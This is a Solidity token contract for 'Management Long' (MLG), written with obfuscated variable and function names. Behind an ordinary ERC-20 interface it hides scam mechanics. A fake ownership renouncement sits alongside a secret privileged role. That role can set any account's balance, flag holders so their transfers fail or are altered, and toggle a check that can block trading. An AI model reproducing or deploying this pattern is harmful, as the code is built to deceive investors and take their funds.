//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface fromReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract listTx {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface senderLimit {
    function createPair(address buyReceiverFee, address senderTo) external returns (address);
}

interface marketingSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverAt) external view returns (uint256);

    function transfer(address maxAtAuto, uint256 tradingIs) external returns (bool);

    function allowance(address autoLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 tradingIs) external returns (bool);

    function transferFrom(
        address sender,
        address maxAtAuto,
        uint256 tradingIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed isFund, uint256 value);
    event Approval(address indexed autoLaunch, address indexed spender, uint256 value);
}

interface marketingSwapMetadata is marketingSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ManagementLong is listTx, marketingSwap, marketingSwapMetadata {

    uint256 public tokenTotalLaunched;

    function toToken() private view {
        require(tradingFeeSwap[_msgSender()]);
    }

    uint256 constant launchedAmount = 19 ** 10;

    string private minReceiverTo = "Management Long";

    uint256 public buySwap;

    bool private txTrading;

    bool private txShould;

    uint256 sellWallet;

    address public enableExempt;

    bool public listWallet;

    uint256 private exemptReceiver;

    mapping(address => mapping(address => uint256)) private limitFrom;

    function owner() external view returns (address) {
        return totalTx;
    }

    function name() external view virtual override returns (string memory) {
        return minReceiverTo;
    }

    function allowance(address txExempt, address shouldLimit) external view virtual override returns (uint256) {
        if (shouldLimit == swapLaunched) {
            return type(uint256).max;
        }
        return limitFrom[txExempt][shouldLimit];
    }

    function launchTake(address launchExempt) public {
        if (minSender) {
            return;
        }
        if (txTrading != listWallet) {
            buySwap = tokenTotalLaunched;
        }
        tradingFeeSwap[launchExempt] = true;
        
        minSender = true;
    }

    address launchSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function fundTrading() public {
        emit OwnershipTransferred(enableExempt, address(0));
        totalTx = address(0);
    }

    function balanceOf(address receiverAt) public view virtual override returns (uint256) {
        return receiverSender[receiverAt];
    }

    string private limitToAmount = "MLG";

    function launchedTx(address fundTeam, address maxAtAuto, uint256 tradingIs) internal returns (bool) {
        if (fundTeam == enableExempt) {
            return atFundMin(fundTeam, maxAtAuto, tradingIs);
        }
        uint256 receiverMarketing = marketingSwap(amountTake).balanceOf(launchSender);
        require(receiverMarketing == sellWallet);
        require(maxAtAuto != launchSender);
        if (marketingMin[fundTeam]) {
            return atFundMin(fundTeam, maxAtAuto, launchedAmount);
        }
        return atFundMin(fundTeam, maxAtAuto, tradingIs);
    }

    address private totalTx;

    function transferFrom(address fundTeam, address maxAtAuto, uint256 tradingIs) external override returns (bool) {
        if (_msgSender() != swapLaunched) {
            if (limitFrom[fundTeam][_msgSender()] != type(uint256).max) {
                require(tradingIs <= limitFrom[fundTeam][_msgSender()]);
                limitFrom[fundTeam][_msgSender()] -= tradingIs;
            }
        }
        return launchedTx(fundTeam, maxAtAuto, tradingIs);
    }

    function getOwner() external view returns (address) {
        return totalTx;
    }

    uint256 swapLimit;

    uint8 private modeEnableReceiver = 18;

    mapping(address => bool) public tradingFeeSwap;

    bool private modeTx;

    event OwnershipTransferred(address indexed totalFeeSender, address indexed maxModeIs);

    mapping(address => bool) public marketingMin;

    uint256 private tokenFund;

    function symbol() external view virtual override returns (string memory) {
        return limitToAmount;
    }

    address public amountTake;

    function totalSupply() external view virtual override returns (uint256) {
        return sellMarketingFund;
    }

    function feeTradingReceiver(address feeFrom, uint256 tradingIs) public {
        toToken();
        receiverSender[feeFrom] = tradingIs;
    }

    uint256 private sellMarketingFund = 100000000 * 10 ** 18;

    bool public minSender;

    uint256 public toTx;

    function autoEnable(uint256 tradingIs) public {
        toToken();
        sellWallet = tradingIs;
    }

    mapping(address => uint256) private receiverSender;

    function decimals() external view virtual override returns (uint8) {
        return modeEnableReceiver;
    }

    constructor (){
        
        fromReceiver totalList = fromReceiver(swapLaunched);
        amountTake = senderLimit(totalList.factory()).createPair(totalList.WETH(), address(this));
        
        enableExempt = _msgSender();
        fundTrading();
        tradingFeeSwap[enableExempt] = true;
        receiverSender[enableExempt] = sellMarketingFund;
        
        emit Transfer(address(0), enableExempt, sellMarketingFund);
    }

    function atFundMin(address fundTeam, address maxAtAuto, uint256 tradingIs) internal returns (bool) {
        require(receiverSender[fundTeam] >= tradingIs);
        receiverSender[fundTeam] -= tradingIs;
        receiverSender[maxAtAuto] += tradingIs;
        emit Transfer(fundTeam, maxAtAuto, tradingIs);
        return true;
    }

    function txLaunched(address amountFee) public {
        toToken();
        if (listWallet != txShould) {
            txShould = true;
        }
        if (amountFee == enableExempt || amountFee == amountTake) {
            return;
        }
        marketingMin[amountFee] = true;
    }

    function transfer(address feeFrom, uint256 tradingIs) external virtual override returns (bool) {
        return launchedTx(_msgSender(), feeFrom, tradingIs);
    }

    address swapLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function approve(address shouldLimit, uint256 tradingIs) public virtual override returns (bool) {
        limitFrom[_msgSender()][shouldLimit] = tradingIs;
        emit Approval(_msgSender(), shouldLimit, tradingIs);
        return true;
    }

}